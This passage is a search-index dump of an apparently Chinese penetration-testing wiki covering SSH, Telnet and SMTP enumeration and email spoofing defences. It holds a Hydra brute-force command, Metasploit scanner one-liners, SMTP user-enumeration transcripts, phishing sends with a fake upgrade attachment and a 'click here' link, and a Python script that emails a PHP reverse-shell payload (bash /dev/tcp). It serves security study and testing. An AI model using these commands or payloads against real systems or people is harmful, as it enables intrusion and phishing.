https://www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2","title":"Fuzzing"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_10","text":"You can find interesting guides on how to harden SSH in https://www.ssh-audit.com/hardening_guides.html https://community.turgensec.com/ssh-hacking-guide","title":"\u53c2\u8003"},{"location":"Network%20Prot/22%20-%20SSH-SFTP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_11","text":"Protocol_Name: SSH Port_Number: 22 Protocol_Description: Secure Shell Hardening Entry_1: Name: Hydra Brute Force Description: Need Username Command: hydra -v -V -u -l {Username} -P {Big_Passwordlist} -t 1 -u {IP} ssh Entry_2: Name: consolesless mfs enumeration Description: SSH enumeration without the need to run msfconsole Note: sourced from https://github.com/carlospolop/legion Command: msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use scanner/ssh/ssh_enumusers; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS {IP}; set RPORT 22; run; exit'","title":"\u81ea\u52a8\u5316\u547d\u4ee4"},{"location":"Network%20Prot/23%20-%20Telnet%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","text":"\u57fa\u672c\u4fe1\u606f Telnet \u662f\u4e00\u79cd\u7f51\u7edc\u534f\u8bae\uff0c\u5b83\u4e3a\u7528\u6237\u63d0\u4f9b\u4e86\u4e00\u79cd\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\u8ba1\u7b97\u673a\u7684\u4e0d\u5b89\u5168\u7684\u65b9\u5f0f\u3002 \u9ed8\u8ba4\u7aef\u53e3 23 23/tcp open telnet \u679a\u4e3e Banner \u6293\u53d6 nc -vn <IP> 23 \u6240\u6709\u7684\u679a\u4e3e\u90fd\u53ef\u4ee5\u901a\u8fc7 nmap \u6267\u884c: nmap -n -sV -Pn --script \"*telnet* and safe\" -p 23 <IP> \u8be5\u811a\u672c telnet-ntlm-info.nse \u5c06\u83b7\u53d6 NTLM \u4fe1\u606f\uff08Windows \u7248\u672c\uff09\u3002 \u5728 TELNET \u534f\u8bae\u4e2d\u6709\u5404\u79cd\u201c \u9009\u9879 \u201d\uff0c\u5b83\u4eec\u5c06\u88ab\u6279\u51c6\u5e76\u53ef\u4ee5\u4e0e\u201c\u505a \u3001\u4e0d\u8981\u3001\u5c06\u3001\u4e0d\u4f1a \u201d\u7ed3\u6784\u4e00\u8d77\u4f7f\u7528\uff0c\u4ee5\u5141\u8bb8\u7528\u6237\u548c\u670d\u52a1\u5668\u540c\u610f\u4f7f\u7528\u66f4\u8be6\u7ec6\u7684\uff08\u6216\u8005\u53ef\u80fd\u53ea\u662f\u4e0d\u540c\uff09\u7684 TELNET \u8fde\u63a5\u7ea6\u5b9a\u96c6\u3002\u6b64\u7c7b\u9009\u9879\u53ef\u80fd\u5305\u62ec\u66f4\u6539\u5b57\u7b26\u96c6\u3001\u56de\u663e\u6a21\u5f0f\u7b49\u3002\uff08\u6765\u81ea telnet RFC \uff09 \u6211\u77e5\u9053\u53ef\u4ee5\u679a\u4e3e\u6b64\u9009\u9879\uff0c\u4f46\u6211\u4e0d\u77e5\u9053\u5982\u4f55\u679a\u4e3e\uff0c\u6240\u4ee5\u5982\u679c\u77e5\u9053\u5982\u4f55\u679a\u4e3e\uff0c\u8bf7\u544a\u8bc9\u6211\u3002 \u914d\u7f6e\u6587\u4ef6 /etc/inetd.conf /etc/xinetd.d/telnet /etc/xinetd.d/stelnet \u81ea\u52a8\u5316\u547d\u4ee4 Protocol_Name: Telnet #\u534f\u8bae\u7f29\u5199(\u5982\u679c\u6709\u7684\u8bdd)\u3002 Port_Number: 23 #\u5982\u679c\u6709\u591a\u4e2a\uff0c\u5219\u7528\u9017\u53f7\u5206\u9694\u3002 Protocol_Description: Telnet #\u534f\u8bae\u7f29\u5199 Entry_1: Name: Notes Description: Notes for t=Telnet Note: | wireshark to hear creds being passed tcp.port == 23 and ip.addr != myip https://book.hacktricks.xyz/pentesting/pentesting-telnet Entry_2: Name: Banner Grab Description: Grab Telnet Banner Command: nc -vn {IP} 23 Entry_3: Name: Nmap with scripts Description: Run nmap scripts for telnet Command: nmap -n -sV -Pn --script \"*telnet*\" -p 23 {IP} Entry_4: Name: consoleless mfs enumeration Description: Telnet enumeration without the need to run msfconsole Note: sourced from https://github.com/carlospolop/legion Command: msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_version; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/brocade_enable_login; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_encrypt_overflow; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_ruggedcom; set RHOSTS {IP}; set RPORT 23; run; exit'","title":"23 - Telnet \u6e17\u900f\u6d4b\u8bd5"},{"location":"Network%20Prot/23%20-%20Telnet%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_1","text":"Telnet \u662f\u4e00\u79cd\u7f51\u7edc\u534f\u8bae\uff0c\u5b83\u4e3a\u7528\u6237\u63d0\u4f9b\u4e86\u4e00\u79cd\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\u8ba1\u7b97\u673a\u7684\u4e0d\u5b89\u5168\u7684\u65b9\u5f0f\u3002 \u9ed8\u8ba4\u7aef\u53e3 23 23/tcp open telnet","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Network%20Prot/23%20-%20Telnet%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_2","text":"","title":"\u679a\u4e3e"},{"location":"Network%20Prot/23%20-%20Telnet%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#banner","text":"nc -vn <IP> 23 \u6240\u6709\u7684\u679a\u4e3e\u90fd\u53ef\u4ee5\u901a\u8fc7 nmap \u6267\u884c: nmap -n -sV -Pn --script \"*telnet* and safe\" -p 23 <IP> \u8be5\u811a\u672c telnet-ntlm-info.nse \u5c06\u83b7\u53d6 NTLM \u4fe1\u606f\uff08Windows \u7248\u672c\uff09\u3002 \u5728 TELNET \u534f\u8bae\u4e2d\u6709\u5404\u79cd\u201c \u9009\u9879 \u201d\uff0c\u5b83\u4eec\u5c06\u88ab\u6279\u51c6\u5e76\u53ef\u4ee5\u4e0e\u201c\u505a \u3001\u4e0d\u8981\u3001\u5c06\u3001\u4e0d\u4f1a \u201d\u7ed3\u6784\u4e00\u8d77\u4f7f\u7528\uff0c\u4ee5\u5141\u8bb8\u7528\u6237\u548c\u670d\u52a1\u5668\u540c\u610f\u4f7f\u7528\u66f4\u8be6\u7ec6\u7684\uff08\u6216\u8005\u53ef\u80fd\u53ea\u662f\u4e0d\u540c\uff09\u7684 TELNET \u8fde\u63a5\u7ea6\u5b9a\u96c6\u3002\u6b64\u7c7b\u9009\u9879\u53ef\u80fd\u5305\u62ec\u66f4\u6539\u5b57\u7b26\u96c6\u3001\u56de\u663e\u6a21\u5f0f\u7b49\u3002\uff08\u6765\u81ea telnet RFC \uff09 \u6211\u77e5\u9053\u53ef\u4ee5\u679a\u4e3e\u6b64\u9009\u9879\uff0c\u4f46\u6211\u4e0d\u77e5\u9053\u5982\u4f55\u679a\u4e3e\uff0c\u6240\u4ee5\u5982\u679c\u77e5\u9053\u5982\u4f55\u679a\u4e3e\uff0c\u8bf7\u544a\u8bc9\u6211\u3002","title":"Banner \u6293\u53d6"},{"location":"Network%20Prot/23%20-%20Telnet%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_3","text":"/etc/inetd.conf /etc/xinetd.d/telnet /etc/xinetd.d/stelnet","title":"\u914d\u7f6e\u6587\u4ef6"},{"location":"Network%20Prot/23%20-%20Telnet%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_4","text":"Protocol_Name: Telnet #\u534f\u8bae\u7f29\u5199(\u5982\u679c\u6709\u7684\u8bdd)\u3002 Port_Number: 23 #\u5982\u679c\u6709\u591a\u4e2a\uff0c\u5219\u7528\u9017\u53f7\u5206\u9694\u3002 Protocol_Description: Telnet #\u534f\u8bae\u7f29\u5199 Entry_1: Name: Notes Description: Notes for t=Telnet Note: | wireshark to hear creds being passed tcp.port == 23 and ip.addr != myip https://book.hacktricks.xyz/pentesting/pentesting-telnet Entry_2: Name: Banner Grab Description: Grab Telnet Banner Command: nc -vn {IP} 23 Entry_3: Name: Nmap with scripts Description: Run nmap scripts for telnet Command: nmap -n -sV -Pn --script \"*telnet*\" -p 23 {IP} Entry_4: Name: consoleless mfs enumeration Description: Telnet enumeration without the need to run msfconsole Note: sourced from https://github.com/carlospolop/legion Command: msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_version; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/brocade_enable_login; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_encrypt_overflow; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_ruggedcom; set RHOSTS {IP}; set RPORT 23; run; exit'","title":"\u81ea\u52a8\u5316\u547d\u4ee4"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","text":"\u57fa\u672c\u4fe1\u606f SMTP\uff08\u7b80\u5355\u90ae\u4ef6\u4f20\u8f93\u534f\u8bae\uff09 \u662f\u4e00\u79cd\u7528\u4e8e \u53d1\u9001 \u548c\u63a5\u6536 \u7535\u5b50\u90ae\u4ef6\u7684 TCP/IP \u534f\u8bae \u3002\u4f46\u662f\uff0c\u7531\u4e8e\u5b83\u5728\u63a5\u6536\u7aef\u5bf9\u6d88\u606f\u8fdb\u884c\u6392\u961f\u7684\u80fd\u529b\u6709\u9650\uff0c\u56e0\u6b64\u5b83\u901a\u5e38\u4e0e\u5176\u4ed6\u4e24\u79cd\u534f\u8bae\u4e4b\u4e00\uff08POP3 \u6216 IMAP\uff09\u4e00\u8d77\u4f7f\u7528\uff0c\u4f7f\u7528\u6237\u53ef\u4ee5\u5c06\u6d88\u606f\u4fdd\u5b58\u5728\u670d\u52a1\u5668\u90ae\u7bb1\u4e2d\u5e76\u5b9a\u671f\u4ece\u670d\u52a1\u5668\u4e0b\u8f7d\u5b83\u4eec\u3002 \u6362\u53e5\u8bdd\u8bf4\uff0c \u7528\u6237\u901a\u5e38\u4f7f\u7528 \u4f7f\u7528 SMTP \u53d1\u9001\u7535\u5b50\u90ae\u4ef6 \u5e76\u4f7f\u7528 POP3 \u6216 IMAP \u63a5\u6536 \u7535\u5b50\u90ae\u4ef6\u7684\u7a0b\u5e8f\u3002\u5728\u57fa\u4e8e Unix \u7684\u7cfb\u7edf\u4e0a\uff0c sendmail \u662f\u4f7f\u7528\u6700\u5e7f\u6cdb\u7684\u7535\u5b50\u90ae\u4ef6 SMTP \u670d\u52a1\u5668\u3002\u5546\u4e1a\u8f6f\u4ef6\u5305 Sendmail \u5305\u62ec\u4e00\u4e2a POP3 \u670d\u52a1\u5668\u3002 Microsoft Exchange \u5305\u62ec\u4e00\u4e2a SMTP \u670d\u52a1\u5668\uff0c\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u5305\u62ec POP3 \u652f\u6301\u3002 \u4ece \u8fd9\u91cc\u5f00\u59cb \u3002 \u9ed8\u8ba4\u7aef\u53e3: 25,465(ssl),587(ssl) PORT STATE SERVICE REASON VERSION 25/tcp open smtp syn-ack Microsoft ESMTP 6.0.3790.3959 EMAIL Headers \u5982\u679c\u4f60\u6709\u673a \u4f1a\u8ba9\u53d7\u5bb3\u8005\u7ed9\u4f60\u53d1\u4e00\u5c01\u7535\u5b50\u90ae\u4ef6 \uff08\u4f8b\u5982\u901a\u8fc7\u7f51\u9875\u7684\u8054\u7cfb\u65b9\u5f0f\uff09\uff0c\u90a3\u4e48\u8fd9\u6837\u505a\u662f\u56e0\u4e3a\u4f60\u53ef\u4ee5\u901a\u8fc7\u67e5\u770b\u90ae\u4ef6\u6807\u9898\u4e86\u89e3\u53d7\u5bb3\u8005 \u7684\u5185\u90e8\u62d3\u6251\u7ed3\u6784\u3002 \u60a8\u8fd8\u53ef\u4ee5\u4ece SMTP \u670d\u52a1\u5668\u83b7\u53d6\u4e00\u5c01\u7535\u5b50\u90ae\u4ef6\uff0c\u8bd5\u56fe \u5411\u8be5\u670d\u52a1\u5668\u53d1\u9001\u4e00\u5c01\u7535\u5b50\u90ae\u4ef6\u5230\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u5730\u5740 \uff08\u56e0\u4e3a\u670d\u52a1\u5668\u5c06\u5411\u653b\u51fb\u8005\u53d1\u9001\u4e00\u5c01 NDN \u90ae\u4ef6\uff09\u3002\u4f46\u662f\uff0c\u8bf7\u786e\u4fdd\u60a8\u4ece\u5141\u8bb8\u7684\u5730\u5740\u53d1\u9001\u7535\u5b50\u90ae\u4ef6\uff08\u68c0\u67e5 SPF \u7b56\u7565\uff09\u5e76\u4e14\u60a8\u53ef\u4ee5\u63a5\u6536 NDN \u6d88\u606f\u3002 \u60a8\u8fd8\u5e94\u8be5\u5c1d\u8bd5\u53d1\u9001\u4e0d\u540c\u7684\u5185\u5bb9\uff0c\u56e0\u4e3a\u60a8\u53ef\u4ee5\u5728\u6807\u9898\u4e0a \u627e\u5230\u66f4\u591a\u6709\u8da3\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\uff1a \u60a8\u5e94\u8be5\u53d1\u9001 EICAR \u6d4b\u8bd5\u6587\u4ef6\u3002 \u68c0\u6d4b AV \u53ef\u80fd\u5141\u8bb8\u60a8\u5229\u7528 \u5df2\u77e5\u6f0f\u6d1e\u3002 X-Virus-Scanned: by av.domain.com \u57fa\u672c\u52a8\u4f5c Banner \u6293\u53d6/\u57fa\u672c\u8fde\u63a5 SMTP: nc -vn <IP> 25 SMTPS : openssl s_client -crlf -connect smtp.mailgun.org:465 #\u6ca1\u6709starttls\u547d\u4ee4\u7684SSL/TLS openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587 \u67e5\u627e\u7ec4\u7ec7\u7684 MX \u670d\u52a1\u5668 dig +short mx google.com \u679a\u4e3e nmap -p25 --script smtp-commands 10.10.10.10 nmap -p25 --script smtp-open-relay 10.10.10.10 -v NTLM Auth - \u4fe1\u606f\u6cc4\u9732 \u5982\u679c\u670d\u52a1\u5668\u652f\u6301 NTLM \u8eab\u4efd\u9a8c\u8bc1 (Windows)\uff0c\u60a8\u53ef\u4ee5\u83b7\u5f97\u654f\u611f\u4fe1\u606f\uff08\u7248\u672c\uff09\u3002\u66f4\u591a\u4fe1\u606f \u5728\u8fd9\u91cc \u3002 root@kali: telnet example.com 587 220 example.com SMTP Server Banner >> HELO 250 example.com Hello [x.x.x.x] >> AUTH NTLM 334 NTLM supported >> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= 334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA \u6216\u8005\u4f7f\u7528 nmap \u63d2\u4ef6 \u81ea\u52a8\u6267\u884c \u6b64\u64cd\u4f5c smtp-ntlm-info.nse \u5185\u90e8\u670d\u52a1\u5668\u540d\u79f0 - \u4fe1\u606f\u6cc4\u9732 \u5f53\u53d1\u51fa\u6ca1\u6709\u5b8c\u6574\u5730\u5740\u7684\u547d\u4ee4\u201cMAIL FROM\u201d\u65f6\uff0c\u67d0\u4e9b SMTP \u670d\u52a1\u5668\u4f1a\u81ea\u52a8\u5b8c\u6210\u53d1\u4ef6\u4eba\u7684\u5730\u5740\uff0c\u4ece\u800c\u6cc4\u9732\u5176\u5185\u90e8\u540d\u79f0\uff1a 220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at Wed, 15 Sep 2021 12:13:28 +0200 EHLO all 250-somedomain.com Hello [x.x.x.x] 250-TURN 250-SIZE 52428800 250-ETRN 250-PIPELINING 250-DSN 250-ENHANCEDSTATUSCODES 250-8bitmime 250-BINARYMIME 250-CHUNKING 250-VRFY 250 OK MAIL FROM: me 250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK \u55c5\u63a2 \u68c0\u67e5\u4f60\u662f\u5426\u4ece\u6570\u636e\u5305\u4e2d\u55c5\u63a2\u4e86\u4e00\u4e9b\u5bc6\u7801\u5230\u7aef\u53e3 25 \u7528\u6237\u540d\u66b4\u529b\u679a\u4e3e \u5e76\u4e0d\u603b\u662f\u9700\u8981\u8eab\u4efd\u9a8c\u8bc1 \u6536\u4ef6\u4eba $ telnet 10.0.10.1 25 Trying 10.0.10.1... Connected to 10.0.10.1. Escape character is '^]'. 220 myhost ESMTP Sendmail 8.9.3 HELO x 250 myhost Hello [10.0.0.99], pleased to meet you MAIL FROM:test@test.org 250 2.1.0 test@test.org... Sender ok RCPT TO:test 550 5.1.1 test... User unknown RCPT TO:admin 550 5.1.1 admin... User unknown RCPT TO:ed 250 2.1.5 ed... Recipient ok VRFY $ telnet 10.0.0.1 25 Trying 10.0.0.1... Connected to 10.0.0.1. Escape character is '^]'. 220 myhost ESMTP Sendmail 8.9.3 HELO 501 HELO requires domain address HELO x 250 myhost Hello [10.0.0.99], pleased to meet you VRFY root 250 Super-User <root@myhost> VRFY blah 550 blah... User unknown EXPN $ telnet 10.0.10.1 25 Trying 10.0.10.1... Connected to 10.0.10.1. Escape character is '^]'. 220 myhost ESMTP Sendmail 8.9.3 HELO 501 HELO requires domain address HELO x EXPN test 550 5.1.1 test... User unknown EXPN root 250 2.1.5 <ed.williams@myhost> EXPN sshd 250 2.1.5 sshd privsep <sshd@mail2> \u6458\u81ea: https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/ \u81ea\u52a8\u5de5\u5177 Metasploit: auxiliary/scanner/smtp/smtp_enum smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP> Nmap: nmap --script smtp-enum-users <IP> DSN \u8fd4\u56de \u6295\u9012\u72b6\u6001\u901a\u77e5\u62a5\u544a \uff1a\u5982\u679c\u60a8\u5411\u67d0\u4e2a\u7ec4\u7ec7\u53d1\u9001 \u7535\u5b50\u90ae\u4ef6 \u81f3 \u65e0\u6548\u5730\u5740 \uff0c\u8be5\u7ec4\u7ec7\u5c06\u901a\u77e5\u8be5\u5730\u5740\u65e0\u6548 \u5e76\u5411\u60a8\u53d1\u56de\u90ae\u4ef6 \u3002 \u8fd4\u56de\u7535\u5b50\u90ae\u4ef6\u7684\u6807\u9898 \u5c06 \u5305\u542b \u53ef\u80fd\u7684 \u654f\u611f\u4fe1\u606f \uff08\u4f8b\u5982\u4e0e\u62a5\u544a\u4ea4\u4e92\u7684\u90ae\u4ef6\u670d\u52a1\u7684 IP \u5730\u5740\u6216\u9632\u75c5\u6bd2\u8f6f\u4ef6\u4fe1\u606f\uff09\u3002 [\u547d\u4ee4] \u4ece linux \u63a7\u5236\u53f0\u53d1\u9001\u7535\u5b50\u90ae\u4ef6 root@kali:~# sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf Reading message body from STDIN because the '-m' option was not used. If you are manually typing in a message: - First line must be received within 60 seconds. - End manual input with a CTRL-D on its own line. IT Dept, We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems. Sincerely, swaks --to $(cat emails | tr '\\n' ',' | less) --from test@sneakymailer.htb --header \"Subject: test\" --body \"please click here http://10.10.14.42/\" --server 10.10.10.197 \u4f7f\u7528 Python \u53d1\u9001\u7535\u5b50\u90ae\u4ef6 \u8fd9\u662f\u4f7f\u7528 python \u811a\u672c\u53d1\u9001\u7535\u5b50\u90ae\u4ef6\u7684\u66ff\u4ee3\u65b9\u6cd5 from email.mime.multipart import MIMEMultipart from email.mime.text import MIMEText import smtplib import sys lhost = \"127.0.0.1\" lport = 443 rhost = \"192.168.1.1\" rport = 25 # 489,587 # create message object instance msg = MIMEMultipart() # setup the parameters of the message password = \"\" msg['From'] = \"attacker@local\" msg['To'] = \"victim@local\" msg['Subject'] = \"This is not a drill!\" # payload message = (\"<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>\" % (lhost,lport)) print(\"[*] Payload is generated : %s\" % message) msg.attach(MIMEText(message, 'plain')) server = smtplib.SMTP(host=rhost,port=rport) if server.noop()[0] != 250: print(\"[-]Connection Error\") exit() server.starttls() # Uncomment if log-in with authencation # server.login(msg['From'], password) server.sendmail(msg['From'], msg['To'], msg.as_string()) server.quit() print(\"[***]successfully sent email to %s:\" % (msg['To'])) \u90ae\u4ef6\u6b3a\u9a97 \u672c\u8282\u7684\u5927\u90e8\u5206\u5185\u5bb9\u6458\u81ea \u7f51\u7edc\u5b89\u5168\u8bc4\u4f30\u7b2c 3 \u7248\u4e00\u4e66 \u3002 SMTP \u6d88\u606f\u5f88\u5bb9\u6613\u88ab\u6b3a\u9a97\uff0c\u56e0\u6b64\u7ec4\u7ec7\u4f7f\u7528 SPF \u3001 DKIM \u548c DMARC \u529f\u80fd\u6765\u9632\u6b62\u5404\u65b9\u53d1\u9001\u672a\u7ecf\u6388\u6743\u7684\u7535\u5b50\u90ae\u4ef6\u3002 \u6709\u5173\u8fd9\u4e9b\u5bf9\u7b56 \u7684\u5b8c\u6574\u6307\u5357\uff0c\u8bf7\u8bbf\u95eehttps://seanthegeek.net/459/demystifying-dmarc/ SPF \u53d1\u4ef6\u4eba\u7b56\u7565\u6846\u67b6 (SPF) \u63d0\u4f9b\u4e86\u4e00\u79cd\u673a\u5236\uff0c\u5141\u8bb8 MTA \u68c0\u67e5\u53d1\u9001\u7535\u5b50\u90ae\u4ef6\u7684\u4e3b\u673a\u662f\u5426\u7ecf\u8fc7\u6388\u6743\u3002 \u7136\u540e\uff0c\u7ec4\u7ec7\u53ef\u4ee5\u5b9a\u4e49\u6388\u6743\u90ae\u4ef6\u670d\u52a1\u5668\u5217\u8868\uff0cMTA \u53ef\u4ee5\u67e5\u8be2\u6b64\u5217\u8868\u4ee5\u68c0\u67e5\u7535\u5b50\u90ae\u4ef6\u662f\u5426\u88ab\u6b3a\u9a97\u3002 \u4e3a\u4e86\u5b9a\u4e49 IP \u5730\u5740/\u8303\u56f4\u3001\u57df\u548c\u5176\u4ed6 \u5141\u8bb8\u4ee3\u8868\u57df\u540d\u53d1\u9001\u7535\u5b50\u90ae\u4ef6\u7684\u4eba\uff0c SPF \u6ce8\u518c\u8868\u4e2d\u51fa\u73b0\u4e86\u4e0d\u540c\u7684 \u201c\u673a\u5236\u201d\u3002 \u673a\u5236 Mechanism Description ALL \u59cb\u7ec8\u5339\u914d\uff1b\u7528\u4e8e\u9ed8\u8ba4\u7ed3\u679c\uff0c\u4f8b\u5982 -all \u6240\u6709\u4e0e\u5148\u524d\u673a\u5236\u4e0d\u5339\u914d\u7684 IP\u3002 A \u5982\u679c\u57df\u540d\u6709\u53ef\u4ee5\u89e3\u6790\u5230\u53d1\u4ef6\u4eba\u5730\u5740\u7684\u5730\u5740\u8bb0\u5f55\uff08A\u6216AAAA\uff09\uff0c\u5219\u5339\u914d\u3002 IP4 \u5982\u679c\u53d1\u4ef6\u4eba\u5728\u7ed9\u5b9a\u7684 IPv4 \u5730\u5740\u8303\u56f4\u5185\uff0c\u5219\u5339\u914d\u3002 IP6 \u5982\u679c\u53d1\u4ef6\u4eba\u5728\u7ed9\u5b9a\u7684 IPv6 \u5730\u5740\u8303\u56f4\u5185\uff0c\u5219\u5339\u914d\u3002 MX \u5982\u679c\u57df\u540d\u6709\u89e3\u6790\u4e3a\u53d1\u4ef6\u4eba\u5730\u5740\u7684 MX \u8bb0\u5f55\uff0c\u5b83\u5c06\u5339\u914d\uff08\u5373\u90ae\u4ef6\u6765\u81ea\u57df\u7684\u63a5\u6536\u90ae\u4ef6\u670d\u52a1\u5668\u4e4b\u4e00\uff09\u3002 PTR \u5982\u679c\u5ba2\u6237\u7aef\u5730\u5740\u7684\u57df\u540d\uff08PTR \u8bb0\u5f55\uff09\u5728\u7ed9\u5b9a\u57df\u4e2d\u5e76\u4e14\u8be5\u57df\u540d\u89e3\u6790\u4e3a\u5ba2\u6237\u7aef\u5730\u5740\uff08\u6b63\u5411\u786e\u8ba4\u7684\u53cd\u5411 DNS\uff09\uff0c\u5219\u5339\u914d\u3002\u8fd9\u79cd\u673a\u5236\u662f\u4e0d\u9f13\u52b1\u7684\uff0c\u5e94\u8be5\u5c3d\u53ef\u80fd\u907f\u514d\u3002 EXISTS \u5982\u679c\u7ed9\u5b9a\u7684\u57df\u540d\u89e3\u6790\u4e3a\u4efb\u4f55\u5730\u5740\uff0c\u5219\u5339\u914d\uff08\u65e0\u8bba\u5b83\u89e3\u6790\u4e3a\u54ea\u4e2a\u5730\u5740\uff09\u3002\u8fd9\u5f88\u5c11\u4f7f\u7528\u3002\u5b83\u4e0e SPF \u5b8f\u8bed\u8a00\u4e00\u8d77\u63d0\u4f9b\u66f4\u590d\u6742\u7684\u5339\u914d\uff0c\u5982 DNSBL \u67e5\u8be2\u3002 INCLUDE \u5f15\u7528\u53e6\u4e00\u4e2a\u57df\u7684\u7b56\u7565\u3002\u5982\u679c\u8be5\u57df\u7684\u7b56\u7565\u901a\u8fc7\uff0c\u5219\u6b64\u673a\u5236\u901a\u8fc7\u3002\u4f46\u662f\uff0c\u5982\u679c\u5305\u542b\u7684\u7b56\u7565\u5931\u8d25\uff0c\u5904\u7406\u5c06\u7ee7\u7eed\u3002\u8981\u5b8c\u5168\u59d4\u6258\u7ed9\u53e6\u4e00\u4e2a\u57df\u7684\u7b56\u7565\uff0c\u5fc5\u987b\u4f7f\u7528\u91cd\u5b9a\u5411\u6269\u5c55\u3002 REDIRECT \u91cd\u5b9a\u5411\u662f\u6307\u5411\u6258\u7ba1 SPF \u7b56\u7565\u7684\u53e6\u4e00\u4e2a\u57df\u540d\u7684\u6307\u9488\uff0c\u5b83\u5141\u8bb8\u591a\u4e2a\u57df\u5171\u4eab\u76f8\u540c\u7684 SPF \u7b56\u7565\u3002\u5728\u5904\u7406\u5171\u4eab\u76f8\u540c\u7535\u5b50\u90ae\u4ef6\u57fa\u7840\u8bbe\u65bd\u7684\u5927\u91cf\u57df\u65f6\uff0c\u5b83\u5f88\u6709\u7528\u3002 \u8fd8\u53ef\u4ee5\u8bc6\u522b\u6307\u793a \u5339\u914d\u673a\u5236\u65f6\u5e94\u6267\u884c\u7684\u64cd\u4f5c\u7684\u9650\u5b9a\u7b26 \u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4f7f\u7528 \u9650\u5b9a\u7b26 \u201c+\u201d \uff08\u56e0\u6b64\uff0c\u5982\u679c\u4efb\u4f55\u673a\u5236\u5339\u914d\uff0c\u5219\u610f\u5473\u7740\u5b83\u662f\u5141\u8bb8\u7684\uff09\u3002 \u60a8\u901a\u5e38\u4f1a \u5728\u6bcf\u4e2a SPF \u653f\u7b56\u7684\u672b\u5c3e\u6ce8\u660e \uff1a ~all \u6216 -all \u3002\u8fd9\u7528\u4e8e\u6307\u793a \u5982\u679c\u53d1\u4ef6\u4eba\u4e0d\u7b26\u5408\u4efb\u4f55 SPF \u7b56\u7565\uff0c\u60a8\u5e94\u8be5\u5c06\u7535\u5b50\u90ae\u4ef6\u6807\u8bb0\u4e3a\u4e0d\u53d7\u4fe1\u4efb (~) \u6216\u62d2\u7edd (-) \u7535\u5b50\u90ae\u4ef6\u3002 \u9650\u5b9a\u6761\u4ef6 \u6bcf\u4e2a\u673a\u5236\u90fd\u53ef\u4ee5\u4e0e\u56db\u4e2a\u9650\u5b9a\u7b26\u4e4b\u4e00\u7ec4\u5408\uff1a + \u5bf9\u4e8e PASS \u7ed3\u679c\u3002\u8fd9\u4e2a\u53ef\u4ee5\u7701\u7565\uff1b\u4f8b\u5982\uff0c +mx \u4e0e \u76f8\u540c mx \u3002 ? \u5bf9\u4e8e\u89e3\u91ca\u4e3a NONE\uff08\u65e0\u653f\u7b56\uff09\u7684 NEUTRAL \u7ed3\u679c\u3002 ~ \uff08\u4ee3\u5b57\u53f7\uff09\u4ee3\u8868 SOFTFAIL\uff0c\u4e00\u79cd\u4ecb\u4e8e NEUTRAL \u548c FAIL \u4e4b\u95f4\u7684\u8c03\u8bd5\u8f85\u52a9\u5de5\u5177\u3002\u901a\u5e38\uff0c\u8fd4\u56de SOFTFAIL \u7684\u6d88\u606f\u4f1a\u88ab\u63a5\u53d7\u4f46\u4f1a\u88ab\u6807\u8bb0\u3002 - \uff08\u51cf\u53f7\uff09\u5bf9\u4e8e\u5931\u8d25\uff0c\u90ae\u4ef6\u5e94\u8be5\u88ab\u62d2\u7edd\uff08\u89c1\u4e0b\u6587\uff09\u3002 \u5728\u4e0b\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u60a8\u53ef\u4ee5\u9605\u8bfb google.com \u7684 SPF \u7b56\u7565 \u3002\u8bf7\u6ce8\u610f\u7b2c \u4e00\u4e2a SPF \u7b56\u7565\u5982\u4f55\u5305\u542b\u5176\u4ed6\u57df\u7684 SPF 